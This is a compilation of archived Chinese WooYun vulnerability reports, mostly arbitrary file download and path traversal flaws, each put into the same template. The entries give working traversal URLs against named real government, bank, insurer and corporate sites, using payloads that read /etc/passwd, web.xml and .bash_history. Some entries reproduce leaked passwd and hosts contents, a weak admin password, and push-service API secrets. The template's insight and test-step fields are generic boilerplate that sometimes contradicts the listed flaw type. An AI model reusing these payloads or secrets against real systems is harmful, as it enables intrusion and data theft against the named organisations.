**修复**: 1、数据库防下载；2、iis设置中避免目录遍历；3、加强口令设置，口令若到不需要下载数据库也可以登入；
---

---
### [wooyun-2015-0134965] IBM某系统任意文件下载漏洞
**厂商**: IBM | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Hardware Management Console (V7R**.**.**.**)Hardware Management Console (HMC)，以 IBM System xSeries 硬件架构为基础，它是一个服务器，您可以用它来管理 AIX 集群。HMC 自带执行安装时所需的媒体，无需备份操作系统。HMC 还包含配置信息和受管理的集群服务器的控制台数据。通过 HMC 上的命令行捕获配置数据，但通过 CLI 实用程序捕获控制台数据。在测试过程中发现其有一个任意文件读取漏洞，影响Hardware Management Console测试地址为：https://10.1xx.xx.xx/help/topic/base/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpassw

**POC**: 如图

**绕过**: 直接利用

**修复**: 过滤.  /等字符，估计django的问题
---

---
### [wooyun-2013-045459] 智网科技邮件系统任意文件下载
**厂商**: 智网科技 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: EXP：http://sns.com.cn/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-062099] 淘豆网设计缺陷可导致他人账户余额损失
**厂商**: 淘豆网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件下载URI，id便是要下载的目标文档例如http://www.taodocs.com/p-3099622.html的3099622就是文档的id漏洞的利用的方法是替换cookie中的user_id20805是被害人的idid的获得方法有多种，其中可以通过查看用户空间的头像，链接 都有用户id的提示测试的时候 被害人20805的余额是不够的所以后面换成另外一个被害人 id=184如何知道余额够不够？方法是替换掉cookie里的user_id后，访问该user_id的用户空间

**POC**: 下载前 ￥53.27下载 ￥40 的文档扣剩 ￥13.27下载到的文件

**绕过**: 直接利用

**修复**: 不要相信用户的输入、传递给你的任何数据，哪些数据该在服务器端验证的，必须留在服务器端验证
---

---
### [wooyun-2015-093786] AOL某分站任意系统文件读取漏洞
**厂商**: aol.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://www.shodan.io/host/149.174.97.92149.174.97.92http://huffsmith-shared-a-atc.evip.aol.com/lastroot     pts/0        jenkins-m01.ihos Sat Jan 24 06:48 - 06:48  (00:00)root     pts/0        jenkins-m01.ihos Sat Jan 24 06:48 - 06:48  (00:00)root     pts/0        jenkins-m01.ihos Wed Jan  7 00:48 - 00:48  (00:00)root     pts/0        jenkins-m01.ihos Wed Jan  7 00:48 - 00:48  (00:00)root     pts

**POC**: # Do not  remove the following line, or various programs# that require network functionality will fail.127.0.0.1 localhost.localdomain localhost149.174.108.111 amp-prod-blogside-a114.ihost.aol.com amp-prod-blogside-a114.ihost.aol amp-prod-blogside-a114.ihost amp-prod-blogside-a114

**绕过**: 直接利用

**修复**: 重新配置
---

---
### [wooyun-2014-059814] 某人力资源CMS任意文件下载导致敏感信息泄露
**厂商**: Cncert | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Googledork：inurl: lemis/netweb/该套cms存在任意文件下载漏洞，可导致敏感数据下载lemis/netweb/detail/download.jsp?url=/WEB-INF/&filename=web.xml案例：http://www.yhmohrss.gov.cn/lemis/netweb/detail/download.jsp?url=/WEB-INF/&filename=web.xmlhttp://www.zjhz.hrss.gov.cn/lemis/netweb/detail/download.jsp?url=/WEB-INF/&filename=web.xmlhttp://www.hzsrsj.gov.cn//lemis/netweb/detail/download.jsp?url=/WEB-INF/&filename=web.xmlhttp://w

**POC**: ……

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013802] 家人安全云平台网站任意文件下载漏洞
**厂商**: 广州七七八二信息科技有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 家人安全云平台网站存在任意文件下载漏洞，可查看和下载任意文件如passwd,shadow,导致用户名及密码hash泄露。http://www.jiarenmen.com/http://www.jiarenmen.com/static-content?contentPath=/../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 对链接地址进行过滤。
---

---
### [wooyun-2015-0143173] 大华某漏洞导致某省消防总队某系统任意文件下载、弱口令（涉及几百台设备）
**厂商**: 公安部一所 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此系统是大华平安城市系统，地址mask 区域1.http://**.**.**/可以下载服务器上的任意文件，下一个系统的配置文件管理员弱密码：system 1。登录系统有几百台设备各种服务器配置信息

**POC**: 同上

**绕过**: 直接利用

**修复**: 联系供应商
---

---
### [wooyun-2013-043906] 国家电网任意文件下载
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: download.php?path=没有进行任何过滤，只对参数进行了base64编码。首页可以查看源码导致更多信息泄露。求礼物啊~

**POC**: (见原文)

**绕过**: 编码绕过

**修复**: 你们更专业
---

---
### [wooyun-2016-0166775] 某福利彩票网任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/download?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../bin/bashhttp://**.**.**.**/download?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../bin/sync**.**.**.**/download?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../sbin/nologin

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 隔壁的老王偷了我的手机 一直没有手机用 哎。
---

---
### [wooyun-2011-01795] phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞
**厂商**: 盛大网络 | **年份**: 2011 | **类型**: 文件包含

**元思考**: 触发信号: 上传功能

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞by c4rp3nt3r@0x50sec.orgmail: c4rp3nt3r#gmail.comHomePage:http://www.0x50sec.orgphpcms_auth函数是phpcms里面为了增强程序的安全性的一个加密函数，在play.php、down.php 、download.php等等文件用它来对用户提交的加密字符串进行解密，进入程序流程，如果我们可以控制了phpcms_auth函数的解密，我们就可以通过注射我们的恶意代码，进行攻击。而phpcms_auth采用的是可逆的位异或算法，并且对加密的结果进行了base64编码。对于位异或算法来说只要我们破解了密钥字符串$key我们就完全控制了这个函数的加密解密。对于base64编码主要是处理某些加密后的不可见字符，但是这给了我们一个很好的机会:就是

**POC**: POC：http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL

**绕过**: 过滤绕过, 编码绕过, 截断攻击

**修复**: 略
---

---
### [wooyun-2015-0125464] 邯郸县公安交通网备份文件下载
**厂商**: 邯郸县公安交通网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 备份文件：http://www.hdxjj.gov.cn/hdxjj.zip总计有11M左右，下载完包含数据库直接进后台。没做坏事，就是截个图。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 备份文件勿放web目录下
---

---
### [wooyun-2011-03290] 凡客诚品关键文件下载导致源码泄露
**厂商**: 凡客诚品 | **年份**: 2011 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://www.vancl.com/shopping.rar直接在网站根目录下.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-079513] 某政府信息管理系统任意文件下载（基本上都是档案信息网）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键字：include_page/down.jsp?downpath=http://www.qhda.gov.cn/platformData/infoplat/pub/qhdaweb_2662/include_page/down.jsp?downpath=../../../../index.jsphttp://sh.119.gov.cn/infoplat/platformData/infoplat/pub/xiaofang_2542/docs/201012/res_show/include_page/down.jsp?downpath=../../../../../index.jsphttp://www.yxarchive.gov.cn/yxdaweb/platformData/infoplat/pub/yxdaweb_2532/include_page/down.jsp?downpath

**POC**: http://www.qhda.gov.cn/platformData/infoplat/pub/qhdaweb_2662/include_page/down.jsp?downpath=../../../../index.jsphttp://sh.119.gov.cn/infoplat/platformData/infoplat/pub/xiaofang_2542/docs/201012/res_show/include_page/down.jsp?downpath=../../../../../index.jsphttp://www.yxarchive.gov.cn/yxdaweb/plat

**绕过**: 直接利用

**修复**: xx
---

---
### [wooyun-2014-062973] 中国农业大学任意文件下载
**厂商**: 中国农业大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可导致敏感信息泄露，如下：http://youth.cau.edu.cn/ATTACHMENT/download.php?filepath=./../setting.php看了下download.php，未对请求的文件名过滤 = =

**POC**: 如上

**绕过**: 直接利用

**修复**: 对请求的文件名过滤吧
---

---
### [wooyun-2015-0149279] 泛华保险某系统存在任意文件读取漏洞
**厂商**: 泛华保险服务集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ess.cninsure.net/product/logon/Login.jsp漏洞地址：http://ess.cninsure.net/product/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwd

**POC**: http://ess.cninsure.net/product/f1print/F1PrintKernelJ1.jsp?&RealPath=/root/.bash_history

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-098094] 中国环境检测总站任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.cnemc.cn/news/downLoad.jsp?filePath=http://www.cnemc.cn/news/downLoad.jsp?filePath=news/downLoad.jsp

**POC**: <%@ page contentType="text/html;charset=gbk"%><%@ page import="java.io.File"%><%@ page import="java.io.*"%><%@ page import="java.net.*"%><%String filePath = request.getParameter("filePath");String root = request.getRealPath("/");String fileName = "";filePath=filePath.replaceAll("..//", "");filePath=

**绕过**: 直接利用

**修复**: 你们比我懂~
---

---
### [wooyun-2015-0147850] 北京某政府站信息泄漏
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京某政府站服务器配置不当，web备份文件下载,导致数据库密码泄漏，配置泄漏

**POC**: 1.网站根目录未正确配置2.配置泄漏3.管理员密码查看

**绕过**: 直接利用

**修复**: 做好服务器配置
---

---
### [wooyun-2014-076179] 西安智行深度体检目录遍历+权限绕过+敏感信息泄露
**厂商**: 西安智行深度体检中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 西安智行深度体检中心目录遍历+权限绕过+众多体检者信息泄露，并且网站可查询体检报告目录遍历：http://www.healwis.com/admin/权限绕过敏感信息泄露：体检预约信息泄露，包括姓名和手机号等信息

**POC**: 不好意思，全放到详细说明里面了

**绕过**: 过滤绕过

**修复**: 这个找开发商，太不负责任了
---

---
### [wooyun-2015-0110419] 中国移动旗下校讯通平台任意文件下载
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址http://hr.edu.xxt.cn/download/downloadExcel.jsp?excelName=.%2Fdownload%2FdownloadExcel.jsp&downloadId=1677

**POC**: 漏洞地址http://hr.edu.xxt.cn/download/downloadExcel.jsp?excelName=.%2Fdownload%2FdownloadExcel.jsp&downloadId=1677

**绕过**: 直接利用

**修复**: 。。。。
---

---
### [wooyun-2014-051280] 国家税务总局网络学院某处任意文件下载
**厂商**: 国家税务总局网络学院某处任意文件下载 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载http://wlpx.tax-edu.net/jsp/common/download.jsp?filepath=/jsp/common/download.jsp

**POC**: http://wlpx.tax-edu.net/jsp/common/download.jsp?filepath=/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 限制 过滤
---

---
### [wooyun-2015-0162381] 车音网某台服务器任意文件下载（影响多个站点）
**厂商**: 深圳市车音网科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 车音网某台服务器任意文件下载（影响多个站点）。共四个站点，都存在漏洞：http://oa.vcyber.com/http://hr.vcyber.com/http://erp.vcyber.com/http://cm.vcyber.com/都存在任意文件下载：/oa/admin/application/file_download.jsp?filePath=c:\windows\win.ini一例为证：http://oa.vcyber.com//oa/admin/application/file_download.jsp?filePath=c:\windows\system.ini

**POC**: 服务器各种文件都可被下载：http://oa.vcyber.com//oa/admin/application/file_download.jsp?filePath=C:\Windows\System32\drivers\etc\hostsecho                7/tcpecho                7/udpdiscard             9/tcp    sink nulldiscard             9/udp    sink nullsystat             11/tcp    users                  #A

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2013-032802] tom某分站漏洞合集（数据侧漏）
**厂商**: TOM在线 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、后台地址侧漏页面http://analytics.tomonline-inc.com/EDM_OLD/login.html2、目录遍历http://analytics.tomonline-inc.com/libs/editor/3、phpmyadmin可以setuphttp://analytics.tomonline-inc.com/phpmyadmin/setup/index.php4、phpmyadmin root空口令登录http://analytics.tomonline-inc.com/phpmyadminroot5、phpinfo泄露网站路径http://analytics.tomonline-inc.com/phpinfo.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 分别修复吧
---

---
### [wooyun-2015-0117774] 永安保险某系统存在任意文件下载漏洞
**厂商**: 永安保险 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 永安保险保险卡激活系统http://card.yaic.com.cn/online/web/sale/card/login.jsp问题出在保险条款下载处http://card.yaic.com.cn/online/web/sale/card/download/download.jsp

**POC**: http://card.yaic.com.cn/online/sale/card/downloadPage.do?fileName=/../../../../../WEB-INF/web.xmlhttp://1.85.2.249/online/sale/card/downloadPage.do?fileName=/../../../../../web/sale/card/login.jsp

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-022762] 多玩某站任意文件读取
**厂商**: 广州多玩 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://adcms.duowan.com/resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xml

**POC**: WEB-INF/password.xml<!-- password.xml --><authenticator><!-- professors --><user name='snape' password='I7HdZr****6hZLlSd2o+CA==' roles='professor,slytherin'/><user name='mcgonagall' password='4sls****eTo0sv5hGkZWag==' roles='professor,gryffindor'/><!-- students --><user name='harry' password='uTOZT

**绕过**: 直接利用

**修复**: .
---

---
### [wooyun-2013-028867] 某国土资源局存在任意文件下载漏洞
**厂商**: 某地方国土资源局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.lsgtzy.com/Second_DownLoadFile.aspx?name=../../web.config可下载任意文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: xxoo
---

---
### [wooyun-2015-0147749] 江南证券某站存在目录遍历（可遍历服务器上的敏感信息）
**厂商**: 江南证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/，江南证券wap网站存在目录遍历，可遍历服务器上的敏感信息。

**POC**: **.**.**.**/smenu.php?PHPSESSID=qghg38hvbub9i7qle25b5jcrr3&menu=../../../../../../../../../../../../../etc/passwd%00f.html可直接读到passwd文件加到burp里暴力破一下路径，随便翻了两个文件看看

**绕过**: 直接利用

**修复**: 做好目录限制。
---

---
### [wooyun-2015-0159637] 壁虎养车配置不当导致大量敏感信息泄露
**厂商**: 壁虎养车 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://image.91bihu.com/images/2015/11/10/IDCard/

**POC**: http://image.91bihu.com/images/2015/10/10/baoxian/29394_%E5%B9%B3%E5%AE%89_%E5%BE%90%E6%96%87%E6%96%8C_%E5%95%86%E4%B8%9A%E9%99%A9%E4%BF%9D%E5%8D%95_PCC010001150100207725.pdf

**绕过**: 直接利用

**修复**: 1、关闭目录索引功能；2、略
---

---
### [wooyun-2013-040001] 招商银行某系统任意文件下载漏洞
**厂商**: 招商银行 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以download任意文件。。请联系开发商进行整改

**POC**: root:!:0:0::/:/usr/bin/kshdaemon:!:1:1::/etc:bin:!:2:2::/bin:sys:!:3:3::/usr/sys:adm:!:4:4::/var/adm:uucp:!:5:5::/usr/lib/uucp:guest:!:100:100::/home/guest:nobody:!:4294967294:4294967294::/:lpd:!:9:4294967294::/:lp:*:11:11::/var/spool/lp:/bin/falseinvscout:*:6:12::/var/adm/invscout:/usr/bin/kshsnapp

**绕过**: 直接利用

**修复**: 正则 过滤../限制并限制访问文件类型
---

---
### [wooyun-2015-0134085] 某图书检索系统通用任意文件下载
**厂商**: cncert | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Google:inurl:/opac/index.jsp

**POC**: 第一处：**.**.**.**:8070/module/download.jsp?filename=..\WEB-INF\web.xml**.**.**.**:8070/module/download.jsp?filename=..\WEB-INF\web.xmlhttp://**.**.**.**:8070/module/download.jsp?filename=..\WEB-INF\web.xml**.**.**.**:8070/module/download.jsp?filename=..\WEB-INF\web.xmlhttp://**.**.**.**:8070/module/do

**绕过**: 直接利用

**修复**: 禁止跨目录
---

---
### [wooyun-2015-0135779] 国联证券某系统存在任意文件下载漏洞
**厂商**: 国联证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接访问下面url，即可直接登录员工权限页面http://oa.glsc.com.cn:10040/glzqehr/df_login.do?method=checkLogin&userid=ReeMCd4ylOs%3D&encrypt=y  userid参数可以直接控制登录下面链接可以任意下载文件http://oa.glsc.com.cn:10040/glzqehr/personBase.do?method=Df_openLicense&licenseName=c:\boot.ini保存读取到的图片，另存为.txt，即可查看到文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 会话验证,过滤
---

---
### [wooyun-2015-0154051] 国都证券某系统存在任意文件下载漏洞
**厂商**: 国都证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:9090/live/p.do漏洞地址：http://**.**.**.**:9090//live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd

**POC**: http://**.**.**.**:9090//live/down.jsp?file=../../../../../../../../../../../../../../../../etc/hostshttp://**.**.**.**:9090//live/down.jsp?file=../../../../../../../../../../../../../../../../root/.bash_history

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2016-0170214] 深圳市易特快物流有限公司主站存在任意文件读取漏洞
**厂商**: 深圳市易特快物流有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题IP**.**.**.**使用构造的payload**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/

**POC**: 从图中可以看到，可以访问到数据和配置信息~~

**绕过**: 直接利用

**修复**: 不懂~
---

---
### [wooyun-2013-024121] 加多宝数据库文件被下载
**厂商**: 加多宝 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://chunjie.wlj-china.com/data.zip

**POC**: http://chunjie.wlj-china.com/data.ziphttp://chunjie.wlj-china.com/Goods.zip

**绕过**: 直接利用

**修复**: 删除了这些备份文件就可以，凉茶我只喝加多宝。永远支持加多宝！
---

---
### [wooyun-2011-02692] 网易某分站目录遍历
**厂商**: 网易 | **年份**: 2011 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://220.181.99.60:80/mobile/register.jsp?step=../../../../../../../../../../etc/passwd%00.png

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036033] 国家电网某公司配置不当导致重要信息泄露
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标网站：http://jyxx.ah.sgcc.com.cn/login.aspx?ReturnUrl=%2fweb%2findex.aspx从该网站界面来看，能看的信息是很有限的，目测是只有登录才能查到一些交易信息。该网站在配置时存在目录遍历的漏洞：直接在浏览器输入：http://jyxx.ah.sgcc.com.cn/web/file/直接能够看到file文件夹内的信息，内容很多，有的还有excel表格，这些file是不应该放在WEB中的，即使放也要加个访问控制：1、http://jyxx.ah.sgcc.com.cn/web/file/fdqjyqk/Book1.xls2、出现的大量表格：http://jyxx.ah.sgcc.com.cn/web/file/jyjhwcqk/Book5%EF%BC%881%E6%9C%8831%E6%97%A5%EF%BC%89.xls

**POC**: 内容好多，都是业务数据,网络不好，不贴了

**绕过**: 直接利用

**修复**: 1、file文件是不应该放在WEB中的，即使放也要加个访问控制；2、禁止遍历。
---

---
### [wooyun-2015-0145240] 爱吧某处配置不当导致部分数据库沦陷(涉及300多万用户信息)
**厂商**: 爱吧 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: elasticsearch 任意文件读取 ，可读shadowhttp://www.aiba.com:9200/_plugin/bigdesk/../../../../../../etc/passwd （不能用浏览器访问）找啊找啊/home/stan/.bash_history 发现nginx配置文件 /usr/local/nginx/conf/nginx.confweb目录就出来了 /home/www/web继续找啊找啊极光推送$appkeys = 'b4cd89a03e6141d2e1bb3cc2';$masterSecret = '2ad5449f59ec23c6ed1ffc3d';$url = 'http://api.jpush.cn:8800/sendmsg/v2/sendmsg';短信猫http://sdk2.zucp.net:8060/webservice.asmx/mt"sn

